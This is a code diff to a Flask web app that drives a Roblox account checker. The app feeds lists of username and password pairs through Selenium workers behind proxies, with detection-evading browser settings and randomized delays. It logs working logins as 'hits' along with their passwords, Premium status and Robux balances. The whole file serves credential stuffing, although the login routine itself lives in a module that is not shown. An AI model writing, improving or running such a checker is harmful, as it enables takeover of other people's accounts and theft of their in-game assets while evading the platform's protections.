@@ -1,4 +1,4 @@
-# app.py - Railway Edition with Improved Driver Creation
+# app.py - Fixed to capture wf.py logs
 
 import os
 import sys
@@ -19,6 +19,29 @@ logging.getLogger('eventlet').setLevel(logging.ERROR)
 from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
+
+# ============================================================
+# CAPTURE WF.PY LOGS AND REDIRECT TO WEB
+# ============================================================
+class WebLogger:
+    """Capture wf.py logs and send to web interface"""
+    def __init__(self):
+        self.logs = []
+    
+    def log(self, message):
+        # Send to web socket
+        try:
+            socketio.emit('log', {
+                'time': datetime.now().strftime('%H:%M:%S'),
+                'message': message,
+                'level': 'info'
+            })
+        except:
+            pass
+        print(message)
+
+# Create global logger instance
+web_logger = WebLogger()
 
 # ============================================================
 # RAILWAY CHROME FIX
@@ -42,9 +65,6 @@ try:
     from selenium import webdriver
     from selenium.webdriver.chrome.options import Options
     from selenium.webdriver.chrome.service import Service
-    from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
     from wf import DriverManager
     
     def railway_create_driver(self, proxy=None, worker_id=0):
@@ -54,7 +74,7 @@ try:
             
             options = Options()
             
-            # More robust headless options for Railway
+            # Headless options for Railway
             options.add_argument("--headless=new")
             options.add_argument("--no-sandbox")
             options.add_argument("--disable-dev-shm-usage")
@@ -63,21 +83,10 @@ try:
             options.add_argument("--disable-blink-features=AutomationControlled")
             options.add_argument("--disable-extensions")
             options.add_argument("--disable-plugins")
-            options.add_argument("--disable-images")
-            options.add_argument("--disable-javascript")
             options.add_argument("--ignore-certificate-errors")
-            options.add_argument("--disable-crash-reporter")
             options.add_argument("--disable-notifications")
             options.add_argument("--disable-popup-blocking")
             options.add_argument("--disable-infobars")
-            options.add_argument("--disable-background-timer-throttling")
-            options.add_argument("--disable-backgrounding-occluded-windows")
-            options.add_argument("--disable-renderer-backgrounding")
-            options.add_argument("--disable-ipc-flooding-protection")
-            options.add_argument("--disable-hang-monitor")
-            options.add_argument("--disable-browser-side-navigation")
-            
-            # User agent to avoid detection
             options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
             
             options.add_experimental_option("excludeSwitches", ["enable-automation"])
@@ -88,17 +97,6 @@ try:
             if os.path.exists(chrome_bin):
                 options.binary_location = chrome_bin
                 print(f"[DRIVER] Using Chrome: {chrome_bin}")
-            else:
-                # Try to find Chrome
-                try:
-                    import subprocess
-                    result = subprocess.run(['which', 'google-chrome'], capture_output=True, text=True)
-                    if result.stdout:
-                        chrome_bin = result.stdout.strip()
-                        options.binary_location = chrome_bin
-                        print(f"[DRIVER] Found Chrome at: {chrome_bin}")
-                except:
-                    pass
             
             if proxy:
                 options.add_argument(f'--proxy-server={proxy}')
@@ -109,25 +107,12 @@ try:
                 service = Service(executable_path=chromedriver_path)
                 print(f"[DRIVER] Using ChromeDriver: {chromedriver_path}")
             else:
-                try:
-                    import subprocess
-                    result = subprocess.run(['which', 'chromedriver'], capture_output=True, text=True)
-                    if result.stdout:
-                        chromedriver_path = result.stdout.strip()
-                        service = Service(executable_path=chromedriver_path)
-                        print(f"[DRIVER] Found ChromeDriver at: {chromedriver_path}")
-                    else:
-                        service = Service()
-                except:
-                    service = Service()
+                service = Service()
             
-            # Create driver with longer timeouts
             driver = webdriver.Chrome(service=service, options=options)
-            driver.set_page_load_timeout(60)  # Increased timeout
+            driver.set_page_load_timeout(60)
             driver.set_script_timeout(60)
-            driver.implicitly_wait(10)
             
-            # Store driver
             driver_id = f"worker_{worker_id}"
             self.active_drivers[driver_id] = driver
             self.usage_count[driver_id] = 1
@@ -187,6 +172,7 @@ checker = None
 work_queue = queue.Queue()
 
 def add_log(message, level='info'):
+    """Add a log entry and emit to web"""
     log_entry = {
         'time': datetime.now().strftime('%H:%M:%S'),
         'message': message,
@@ -219,7 +205,8 @@ def get_status():
         'recent_results': checker_state['recent_results'][-20:],
         'total_accounts': checker_state['total_accounts'],
         'current_account': checker_state['current_account'],
-        'hits': checker_state['hits'][-50:]
+        'hits': checker_state['hits'][-50:],
+        'logs': checker_state['logs'][-50:]
     })
 
 @app.route('/api/start', methods=['POST'])
@@ -260,6 +247,7 @@ def start_checker():
             if line and not line.startswith('#'):
                 proxies.append(line)
     
+    # Create checker
     checker = AntraxRblxChecker()
     checker.accounts = accounts
     checker.min_delay = min_delay
@@ -272,6 +260,7 @@ def start_checker():
         checker.proxy_manager.proxies = proxies
         checker.proxy_manager.active_proxies = proxies.copy()
     
+    # Reset state
     checker_state['running'] = True
     checker_state['paused'] = False
     checker_state['accounts'] = accounts
@@ -298,6 +287,7 @@ def start_checker():
     }
     checker_state['total_accounts'] = len(accounts)
     
+    # Start workers
     work_queue = queue.Queue()
     for account in accounts:
         work_queue.put(account)
@@ -313,6 +303,7 @@ def start_checker():
     monitor_thread = threading.Thread(target=monitor_progress, args=(len(accounts),), daemon=True)
     monitor_thread.start()
     
+    add_log(f'🚀 Checker started with {len(accounts)} accounts', 'success')
     add_log(f'🚀 Checker started with {len(accounts)} accounts and {len(proxies)} proxies', 'success')
     add_log(f'⚙️ Using {max_workers} workers', 'info')
     
@@ -323,8 +314,10 @@ def start_checker():
     })
 
 def checker_worker(worker_id, work_queue):
+    """Worker thread using the original checker"""
     while checker_state['running'] and not work_queue.empty():
         try:
+            # Check if paused
             while checker_state['paused'] and checker_state['running']:
                 time.sleep(0.5)
             
@@ -334,11 +327,22 @@ def checker_worker(worker_id, work_queue):
             account = work_queue.get_nowait()
             checker_state['current_account'] = account.username
             
-            verified_account = checker.verify_account(account, worker_id)
+            add_log(f'🔍 Worker {worker_id}: Checking {account.username}...', 'info')
             
+            try:
+                # Use the original verify_account method
+                verified_account = checker.verify_account(account, worker_id)
+            except Exception as e:
+                add_log(f'❌ Worker {worker_id}: {account.username} - Error: {str(e)}', 'error')
+                verified_account = account
+                verified_account.status = 'error'
+                verified_account.message = str(e)[:100]
+            
+            # Update stats
             stats = checker_state['stats']
             stats['verified'] += 1
             
+            # Map status to stats
             status_map = {
                 'valid': 'valid',
                 'invalid_password': 'wrong_password',
@@ -352,6 +356,7 @@ def checker_worker(worker_id, work_queue):
             if verified_account.status in status_map:
                 stats[status_map[verified_account.status]] += 1
             
+            # Check if valid
             if verified_account.status == 'valid':
                 stats['valid'] += 1
                 if verified_account.premium:
@@ -359,6 +364,7 @@ def checker_worker(worker_id, work_queue):
                 if verified_account.robux > 0:
                     stats['total_robux'] += verified_account.robux
                 
+                # Store hit
                 hit_data = {
                     'username': verified_account.username,
                     'password': verified_account.password,
@@ -375,6 +381,7 @@ def checker_worker(worker_id, work_queue):
                 checker_state['hits'].append(hit_data)
                 emit_socket_event('hit', hit_data)
             
+            # Add to recent results
             result_line = {
                 'worker': worker_id,
                 'status': verified_account.status,
@@ -387,8 +394,10 @@ def checker_worker(worker_id, work_queue):
             if len(checker_state['recent_results']) > 50:
                 checker_state['recent_results'].pop(0)
             
+            # Emit update
             emit_socket_event('update', result_line)
             
+            # Add log
             if verified_account.status == 'valid':
                 premium_tag = ' [PREMIUM]' if verified_account.premium else ''
                 robux_tag = f' | R${verified_account.robux:,}' if verified_account.robux > 0 else ''
@@ -401,8 +410,11 @@ def checker_worker(worker_id, work_queue):
                     status_emoji = '⏳'
                 elif verified_account.status == 'timeout':
                     status_emoji = '⏰'
+                elif verified_account.status == 'invalid_password':
+                    status_emoji = '🔑'
                 add_log(f'{status_emoji} Worker {worker_id}: {verified_account.username} - {verified_account.message}', 'info')
             
+            # Delay between checks
             if checker_state['running']:
                 delay = random.uniform(checker.min_delay, checker.max_delay)
                 time.sleep(delay)
@@ -412,10 +424,14 @@ def checker_worker(worker_id, work_queue):
         except queue.Empty:
             break
         except Exception as e:
-            add_log(f'Error in worker {worker_id}: {str(e)}', 'error')
-            work_queue.task_done()
+            add_log(f'❌ Error in worker {worker_id}: {str(e)}', 'error')
+            try:
+                work_queue.task_done()
+            except:
+                pass
 
 def monitor_progress(total):
+    """Monitor and emit progress updates"""
     while checker_state['running']:
         try:
             stats = checker_state['stats']
@@ -450,7 +466,7 @@ def monitor_progress(total):
             time.sleep(1)
             
         except Exception as e:
-            add_log(f'Monitor error: {str(e)}', 'error')
+            add_log(f'❌ Monitor error: {str(e)}', 'error')
             time.sleep(1)
 
 @app.route('/api/stop', methods=['POST'])
